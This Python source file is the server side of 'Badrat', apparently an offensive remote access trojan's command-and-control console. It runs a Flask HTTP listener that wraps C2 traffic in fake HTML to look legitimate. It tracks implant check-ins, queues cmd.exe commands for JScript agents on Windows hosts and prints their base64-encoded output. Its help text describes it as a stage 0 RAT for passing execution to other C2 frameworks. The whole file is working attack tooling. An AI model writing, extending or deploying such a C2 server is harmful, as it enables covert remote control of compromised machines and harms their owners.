#!/usr/bin/env python3
from flask import Flask, request
import time
import json
import base64
import threading
import sys
import logging

# CSCI 201 teacher: Noooo you can't just use global variables to make things easier
# haha, global variables go brrr
RED = '\033[91m'
ENDC = '\033[0m'
UNDERLINE = '\033[4m'
port=8080
commands = {}
rats = {}

def serve_server(port=8080):
    app = Flask(__name__)

    html = "<html><head><title>http server</title></head>\n"
    html += "<body>\n"
    html += "<b>\n"
    #Wrap C2 comms in html and html2 code to make requests look more legitimate
    html2 = "</b>\n"
    html2 = "</body></html>\n"

    #Disable annoying console output for GET/POST requests
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET'])
    def gtfo(path):
        # The rat code uses the POST method ONLY! A GET request is not from a rat
        print("[!] GET request from non-rat client requested path /" + path)
        return(html + "WTF who are you? go away pls\n" + html2)

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['POST'])
    def badrat_comms(path):

        # Parse POST parameters
        post_json = request.get_json(force=True)
        post_dict = dict(post_json)
        ratID = str(post_dict['agentid'])

        if("agentid" in post_dict.keys()):
            # Update checkin time for an agent every checkin
            checkin = time.strftime("%H:%M:%S", time.localtime())
            rats[ratID] = checkin

            # If there is no current command for a rat, create a blank one
            if not ratID in commands:
                commands[ratID] = ""

        if("retval" in post_dict.keys()):
            print("\nResults from rat " + str(post_dict['agentid']) + "\n")
            print(base64.b64decode(post_dict['retval']).decode('utf-8'))

        return(html + json.dumps({"cmd": commands[ratID]}) + "\n" + html2)

    app.run(host="0.0.0.0", port=port)

def get_rats():
    print("\nrat ID\t\tcheck-in")
    print("--------\t--------")
    for rat, checkin in rats.items():
        print(rat + "    \t" + checkin)
    print("")

def remove_rat(ratID):
    if(ratID == "all"):
        print("[*] Removing ALL rats")
        rats.clear()
    else:
        try:
            del rats[ratID]
            print("[*] Removing rat " + ratID)
        except:
            print("[!] Can't delete rat " + ratID + " for some reason")

def get_help():
    print("\nBadrat is a remote access tool with the goal of being as janky as possible ")
    print("It is intended to be used as a stage 0 rat, mostly to pass execution to other C2 frameworks")
    print("-------------------------------------------------------------------------")
    print("")
    print("Server commands: -- commands to control the badrat server")
    print("help -- it's this help page, duh")
    print("rats/agents/sessions -- gets the list of rats and their last checkin time")
    print("exit -- exits the badrat console and shuts down the listener")
    print("<ratID> -- start interacting with the specified rat")
    print("back -- backgrounds the current rat and goes to the main menu")
    print("remove -- unregisters the specified <ratID> OR \"all\" for all rats")
    print("")
    print("Rat commands: -- commands to interact with a badrat rat")
    print("kill -- when interacting with a rat, type kill to task the rat to shut down")
    print("spawn -- used to spawn a new rat in a new wscript process.")
    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
    print("-------------------------------------------------------------------------")
    print("")
    print("Extra things to know:")
    print("The agent/rat is written in Windows JScript and executed with wscript.exe")
    print("The server is written in python and uses an HTTP listener for C2 comms")
    print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
    print("Command output is written to files in the %TEMP% directory, fetched, then the file is deleted")
    print("Spawned rats write their rat code to %TEMP% and currently don't clean themselves up because Windows can't delete files while in use")
    print("Use absolute paths. Badrat_server does not keep track of current directory")
    print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel\n")

if __name__ == "__main__":
    # Start the Flask server
    print("[*] Starting HTTP listener on port " + str(port) + "\n\n")
    server = threading.Thread(target=serve_server, kwargs=dict(port=port), daemon=True)
    server.start()
    time.sleep(1)
    if not server.is_alive():
        print("[!] Could not start listener!")
        sys.exit()

# Main menu
while True:
    inp = input("Badrat //> ")

    # Check if the operator wants to quit badrat
    if(inp == "exit" or inp == "quit"):
        sys.exit()

    # Gets the help info
    elif(inp == "help"):
        get_help()

    # View rats and their latest checkin times
    elif(inp == "agents" or inp == "rats" or inp == "sessions"):
        get_rats()

    # Remove rats -- either by ratID or all
    elif(str.startswith(inp, "remove")):
        if(str.startswith(inp, "all", 6, 3)):
            remove_rat("all")
        else:
            remove_rat(inp.split(" ")[1])

    # Enter rat specific command prompt
    elif(inp in rats.keys()):
        ratID = inp
        while True:
            inp = input(RED + ratID + ENDC + " \\\\> ")
            if(inp == "back" or inp == "exit"):
                break
            elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
                get_rats()
            if(inp.startswith("cd ")):
              print("[!] Full paths only! No cd in badrat")
            elif(inp):
                if(inp == "kill"):
                    print("[*] Tasked rat " + ratID + " to " + RED + "commit Seppuku" + ENDC)
                else:
                    print("[*] Queued command " + UNDERLINE + inp + ENDC + " for " + ratID)
                commands[ratID] = inp
